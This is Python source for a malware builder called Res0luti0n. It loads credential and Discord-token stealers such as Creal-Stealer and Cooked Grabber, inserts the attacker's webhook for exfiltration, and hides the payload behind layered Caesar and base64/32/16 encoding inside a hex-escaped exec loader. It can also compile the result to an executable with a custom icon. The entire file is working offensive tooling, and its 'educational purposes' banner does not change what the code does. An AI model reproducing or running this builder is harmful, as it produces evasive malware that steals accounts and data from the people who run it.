#<---       Res0luti0n builder by 0xSp00f3d      --->
#<---             python 3.x                --->
#<--- Only for educationnal / good purposes --->

import os
import requests
import colorama
import base64
import random
import shutil
import time
import string
import json
from pypresence import Presence
# Function for the discord rich presence
def rich_presence():
    try:
        rpc = Presence("1108425762232606790")
        rpc.connect()
        rpc.update(
            large_image= "resolution_logo",
            large_text = f"Res0luti0n",
            details = f"Python malware builder (POC)",
            state = "by 0xSpoofed",
            buttons=[{"label": "Github", "url": "https://github.com/0xSpoofed/Res0luti0n"}]
        )
    except Exception as e:
        pass

# <---- FILE MANAGEMENT FUNCTIONS ---->
# Function to read a file 
def readfile(path):
    with open(path, 'r', encoding='UTF-8') as f:
        data = f.read()
    return data

# Fonction to write a file
def writefile(path, data):
    with open(path, 'w', encoding='UTF-8') as f:
        f.write(data)

# Function to read a json
def read_json(file_path: str) -> dict:
    with open(file_path, 'r') as json_file:
        data = json.load(json_file)
    return data

# Function to write a json
def write_json(file_path: str, data: dict) -> None:
    with open(file_path, 'w') as json_file:
        json.dump(data, json_file)

# Function to update a json (add a new value)
def update_json(param, value):
    json_data = read_json(f"{os.getcwd()}\\utilities\\config.json")
    json_data[f"{param}"] = str(value)
    write_json(f"{os.getcwd()}\\utilities\\config.json", json_data)

# Function to get the settings stored in config.json
def get_settings():
    with open(f"{os.getcwd()}\\utilities\\config.json", 'r') as json_file:
        json_data = json.load(json_file)
    return json_data["name"], json_data["path"], json_data["requirements"], json_data["webhook"], json_data["exe_yn"], json_data["exe_comp"], json_data["icon"]

# <---- ALL WEBHOOKS FUNCTIONS ---->
# Function to check a webhook (return: Valid or invalid)
def webhook_checker(webhook_link):
    try:
        resp = requests.get(webhook_link)
        if resp.status_code != 200:
            return "Invalid"
        else:
            return "Valid"
    except Exception as e: 
        return "Invalid" 

# <---- PART MANAGEMENT FUNCTIONS ---->
# Function to hash the malware script to create part
def script_hasher(script):
    nb_parties = random.randint(5, 10)
    longueur_partie = len(script) // nb_parties
    parties = [script[i * longueur_partie:(i + 1) * longueur_partie] for i in range(nb_parties - 1)]
    parties.append(script[(nb_parties - 1) * longueur_partie:])
    return parties

# Function to encode a part in base64
def base64_encoder(data):
    bytes_text = data.encode('UTF-8')
    b64_text = base64.b64encode(bytes_text)
    return b64_text.decode('UTF-8')

# Function to encode a part in base32
def base32_encoder(data):
    bytes_text = data.encode('UTF-8')
    b32_text = base64.b32encode(bytes_text)
    return b32_text.decode('UTF-8')

# Function to encode a part in base16
def base16_encoder(data):
    bytes_text = data.encode('UTF-8')
    b16_text = base64.b16encode(bytes_text)
    return b16_text.decode('UTF-8')

# Function to encode a part with Caesar method (return final encoded parts)
def caesar_encoder(part, alpha):
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    text_int = ''
    for c in part:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            c_int = c
        text_int += c_int
    return base64_encoder(text_int + key)

def injector_encoder(part, alpha):
    key = ''.join(random.sample(alpha, 2))
    gap = sum(ord(c) for c in key) % 26
    text_int = ''
    for c in part:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 + gap) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 + gap) % 26 + 65)
        else:
            c_int = c
        text_int += c_int
    return text_int + key


# <---- INJECTOR COMPILATION FUNCTIONS ---->

# Function to obfuscate the injector code 
def obfuscate(injector_script):
    encoding = random.choice(['b64', 'b32', 'b16'])
    first_step = injector_encoder(injector_script, 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
    #base 64 system
    if encoding == 'b64':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b64decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base64_encoder(first_step))
    #base 32 system
    elif encoding == 'b32':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b32decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base32_encoder(first_step))
    #base 16 system
    elif encoding == 'b16':
        content = '''import base64
def cl34n0r(r4w):
    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    d3ctxt = base64.b16decode(r4w).decode('UTF-8')
    k3y = d3ctxt[-2:]
    g4p = sum(ord(c) for c in k3y) % 26
    txt1nt = ''
    for c in d3ctxt[:-2]:
        if c.isalpha():
            if c.islower():
                c_int = chr((ord(c) - 97 - g4p + 26) % 26 + 97)
            else:
                c_int = chr((ord(c) - 65 - g4p + 26) % 26 + 65)
        else:
            c_int = c
        txt1nt += c_int
    return txt1nt
exec(cl34n0r("""R4W"""))'''.replace('R4W', base16_encoder(first_step))
    
    # choice of random letters for obfuscation
    ltr = ''.join(random.choices(string.ascii_uppercase, k=4))
    OFFSET = 10
    VARIABLE_NAME = f'__{ltr}_{ltr}' * 100
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    code = f'{VARIABLE_NAME} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) + 1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + str(byte)
        code += f'{VARIABLE_NAME} += "{_str}"\n'
        index += OFFSET
    code += f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({VARIABLE_NAME}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
    return code

#function to build the injector 
def builder(banner, m, w):
    name, path_, requirements, webhook, exe_yn, exe_comp, icon = get_settings()
    
    if not os.path.exists(path_):
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] The path seems to be incorrect...")
        time.sleep(3)
        main()
    elif webhook_checker(webhook) != "Valid":
        os.system("cls")
        agree = input(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong. Do you want to continue without using webhook (y/n) ?\n ---\n {m}[{w}->{m}]{w} ")
        if agree == 'y':
            pass
        elif agree == 'n':
            main()
        else:   main()     
    elif not name:
        os.system("cls")
        print(f"{banner}\n\n {w}[{m}!{w}] Please enter a valid name!")
        time.sleep(3)
        main()
    
    try:
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        src_hashed = script_hasher(readfile(path_).replace('WBH', webhook))
        recompyler = readfile(os.path.join(os.getcwd(), 'utilities', 'recompyler.cs'))
        src_hashed = [caesar_encoder(part, alpha) for part in src_hashed]

        injector_with_all = readfile(os.path.join(os.getcwd(), 'utilities', 'injector.py')).replace("'RECOMPYLER'", recompyler)
        injector_with_all = injector_with_all.replace("'SRC_HASHED'", str(src_hashed))
        injector_with_all = injector_with_all.replace("'PIPREQUIREMENTS'", str(readfile(requirements)))

        if os.path.exists(name):
            shutil.rmtree(name, ignore_errors=True)
            os.makedirs(name)
        else: os.makedirs(name)
        
        writefile(f'{name}\\{name}.py', obfuscate(injector_with_all))

        if exe_yn == "y":
            script_name = os.path.join(os.getcwd(), name, f"{name}.py")
            target_dir = f"{name}-exe"
            icon_option = f"--icon={icon}" if icon != "None" else ""
            
            if exe_comp == "Cx_freeze":
                cmd = f"""cxfreeze -c "{script_name}" --target-dir {name}-exe {icon_option} --packages=win32api --packages=win32con --packages=platform"""
            elif exe_comp == "Pyinstaller":
                cmd = f"""pyinstaller --noconfirm --onefile --console {icon_option} --distpath {target_dir} --hidden-import win32api --hidden-import win32con --hidden-import platform "{script_name}" """
            os.system("cls")
            os.system(cmd)
            
            if exe_comp == "Pyinstaller":
                shutil.rmtree("build", ignore_errors=True)
                try: os.remove(name + '.spec')
                except: pass
            
            shutil.make_archive(f"{name}-exe", 'zip', name + "-exe")
            shutil.rmtree(f"{name}-exe", ignore_errors=True)
            
        shutil.make_archive(name, 'zip', name)
        shutil.rmtree(name, ignore_errors=True)
            
        os.system("cls")
        input(f"{banner}\n\n {w}[{m}+{w}] Your {name} malware has been successfully built in ({name}.zip)!")
        main()
    
    except Exception as e:
        os.system("cls")
        print(e) #print error 
        input(f"{banner}\n\n {w}[{m}!{w}] An error occurred while building the malware!")
        
# <---- GUI PARTS FUNCTIONS ---->
# Function to show the settings menu
def settings_menu(banner, w, m):
    while True:
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} Malware setup:\n")
        print(f" {m}[{w}1{m}]{w} Select your malware    | {m}[{w}4{m}]{w} EXE settings")
        print(f" {m}[{w}2{m}]{w} Change malware name    | {m}[{w}5{m}]{w} Back to home")
        print(f" {m}[{w}3{m}]{w} Change malware webhook")
        choice_settings = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
        
        if choice_settings == "1": # change the malware
            choice_rat(banner, w, m)
            
        elif choice_settings == "2": # change the malware name
            os.system("cls")
            name = input(f"{banner}\n\n {w}[{m}+{w}] Enter malware name here: ")
            update_json("name", name)
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware name updated succesfully as ({name}) !")
            time.sleep(3)
            
        elif choice_settings == "3": # change the webhook
            os.system("cls")
            webhook = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your webhook here: ")
            update_json("webhook", webhook)
            os.system("cls")
            if webhook_checker(webhook) == "Invalid":
                print(f"{banner}\n\n {m}[{w}!{m}]{w} The webhook you entered seems to be wrong..")
                time.sleep(3)
            else: print(f"{banner}\n\n {m}[{w}+{m}]{w} Malware webhook updated succesfully !"), time.sleep(3)
            
        elif choice_settings == "4": # acces to the executable settings
            exe_settings(banner, w, m)
            
        elif choice_settings == "5": # exit to previous menu
            os.system("cls")
            main()
            
# Function to show executable settings 
def exe_settings(banner, w, m):
    while True:
        exe_yn, exe_comp = get_settings()[4:6]
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} EXE Choice:\n")
        print(f" {m}[{w}1{m}]{w} On/Off               | {m}[{w}3{m}]{w} Change exe logo")
        print(f" {m}[{w}2{m}]{w} Change compiler      | {m}[{w}4{m}]{w} Back to home")

        choice_exe = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")

        if choice_exe == "1": # Exe obfuscation activation
            os.system("cls")
            res = input(f"{banner}\n\n {m}[{w}+{m}]{w} {'Dea' if exe_yn == 'y' else 'A'}ctivate EXE compilation ? (y/n): ")
            if res == "y":
                update_json("exe_yn", "n" if exe_yn == 'y' else 'y')
                os.system("cls")
                print(f"{banner}\n\n {m}[{w}+{m}]{w} Your malware will {'no longer be' if exe_yn == 'y' else 'be'} converted to exe!")
                time.sleep(3)

        elif choice_exe == "2": # Compiler choice
            os.system("cls")
            print(f"{banner}\n -----\n")
            print(f" {m}[{w}+{m}]{w} Compiler choice:\n")
            print(f" {m}[{w}1{m}]{w} Cx Freeze {'(current)' if exe_comp == 'Cx_freeze' else ''}")
            print(f" {m}[{w}2{m}]{w} Pyinstaller {'(current)' if exe_comp == 'Pyinstaller' else ''}")
            print(f" -----\n {m}[{w}3{m}]{w} Back to home")

            choice_compiler = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")

            if choice_compiler in ["1", "2"]: 
                compiler = "Cx_freeze" if choice_compiler == "1" else "Pyinstaller"
                update_json("exe_comp", compiler)
                os.system("cls")
                print(f"{banner}\n\n {m}[{w}+{m}]{w} The {compiler} compiler has been successfully selected!")
                time.sleep(3)

        elif choice_exe == "3": # Logo changer
                os.system("cls")
                logo_path = input(f"{banner}\n\n {m}[{w}+{m}]{w} Enter your .ico here (enter 'None' for no logo): ")
                if logo_path is None or not logo_path.endswith('.ico'):
                    os.system("cls")
                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Invalid logo (use a path without spaces and quotes)! ")
                    time.sleep(3)
                else:
                    update_json("icon", logo_path)
                    os.system("cls")
                    print(f"{banner}\n\n {m}[{w}+{m}]{w} Your logo has been successfully selected !")
                    time.sleep(3)
        
        elif choice_exe == "4":
            settings_menu(banner, w, m)

# Function to change the malware
def choice_rat(banner, w, m):
    while True:
        os.system("cls")
        print(f"{banner}\n -----\n")
        print(f" {m}[{w}+{m}]{w} Malware choice:\n")
        print(f" {m}[{w}1{m}]{w} Cooked Grabber (by Lemon & 0xSpoofed)   | {m}[{w}4{m}]{w} Select your own py malware")
        print(f" {m}[{w}2{m}]{w} Discord-Token-Grabber (by Astraadev)    | {m}[{w}5{m}]{w} Back to home")
        print(f" {m}[{w}3{m}]{w} Creal-Stealer (by Ayhuuu)               |")
        choice_rat = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
        
        if choice_rat == "1": #Cookedgrabber
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "Cooked-grabber.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Cooked-grabber", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} The rat has been successfully defined on: Cooked Grabber !")
            time.sleep(3)
        
        elif choice_rat == "2": # Classic token grabber
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "Token-grabber.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Token-grabber", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Token grabber by Astraadev !")
            time.sleep(3)
        
        elif choice_rat == "3": # Creal Stealer
            os.system("cls")
            update_json("path", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "Creal.py" ))
            update_json("requirements", os.path.join(os.getcwd(), "utilities", "rats", "Creal-stealer", "requirements.txt" ))
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: Creal-Stealer by Ayhuuu !")
            time.sleep(3)
        
        elif choice_rat == "4": # Personnal choice
            os.system("cls")
            input(f"{banner}\n\n {m}[{w}!{m}]{w} Warning: If you select your own malware you must enter your webhook manually !\n ----\n {m}[{w}+{m}]{w} Press enter to continue...")
            os.system("cls")
            path = input(f"{banner}\n\n {w}[{m}+{w}] Enter your malware path here: ")
            req = input(f" -----\n {w}[{m}+{w}] Enter your malware requirements here: ")
            update_json("path", path)
            update_json("requirements", req )
            os.system("cls")
            print(f"{banner}\n\n {m}[{w}+{m}]{w} The malware has been successfully defined on: {os.path.basename(path)} !")
            time.sleep(3)
        
        elif choice_rat == "5": # Back to menu 
            settings_menu(banner, w, m)


# <---- MAIN FUNCTION WITH GUI INCLUDED ---->
def main():
    m = colorama.Fore.LIGHTMAGENTA_EX
    w = colorama.Fore.LIGHTWHITE_EX
    banner = f"""\n ██████╗ ███████╗███████╗ ██████╗ ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
 ██╔══██╗██╔════╝██╔════╝██╔═══██╗██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
 ██████╔╝█████╗  ███████╗██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
 ██╔══██╗██╔══╝  ╚════██║██║   ██║██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
 ██║  ██║███████╗███████║╚██████╔╝███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
 ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
 {w}by 0xSpoofed | Only for educational or good puposes""".replace('█', f'{w}█{m}')
    
    rat_name, rat_path, requirements, webhook, exe_yn, exe_comp, logo = get_settings()
    exe_yn_ehn = "Yes" if exe_yn == "y" else "No" if exe_yn == "n" else "Error"
    exe_comp_ehn = exe_comp if exe_yn == "y" else "None" if exe_yn == "n" else "Error"
    req_check = "Valid" if os.path.exists(requirements) else "Invalid"
    
    webhook_info = webhook_checker(webhook)
    choices = {
        "1": lambda: builder(banner, m, w), # launch the malware build
        "2": lambda: settings_menu(banner, w, m), # access to the setting menu 
        "3": lambda: exit() # exit builder
    }

    while True:
        os.system("cls")
        print(f"""{banner}\n -----\n
 {m}[{w}+{m}]{w} Menu:              |    {m}[{w}INFO{m}]{w} Current Settings:            
                        |
 {m}[{w}1{m}]{w} Build              |    {m}[{w}>{m}]{w} Malware name: {"Unselected" if rat_name == '' else rat_name} {m}[{w}>{m}]{w} Webhook: {webhook_info}
 {m}[{w}2{m}]{w} Setup              |    {m}[{w}>{m}]{w} Malware path: {"Invalid" if rat_path == '' else os.path.basename(rat_path)} {m}[{w}>{m}]{w} ExE compiler: {exe_yn_ehn} | {exe_comp_ehn}
 {m}[{w}3{m}]{w} Exit               |    {m}[{w}>{m}]{w} Requirements path: {req_check} {m}[{w}>{m}]{w} Logo: {os.path.basename(logo) if logo != "None" else "None"} """) 
        
        choice = input(f"\n {m}[{w}->{m}]{w} Enter your choice here: ")
        if choice in choices:
            choices[choice]()
        else:
            os.system("cls")
            print(f"{banner}\n\n {w}[{m}!{w}] Invalid option, please try again.")
            time.sleep(2)
            os.system("cls")
            continue
    
# Start main & rich presence  
if __name__ == '__main__':
    os.system(f"title Resolution builder")
    rich_presence()
    main()
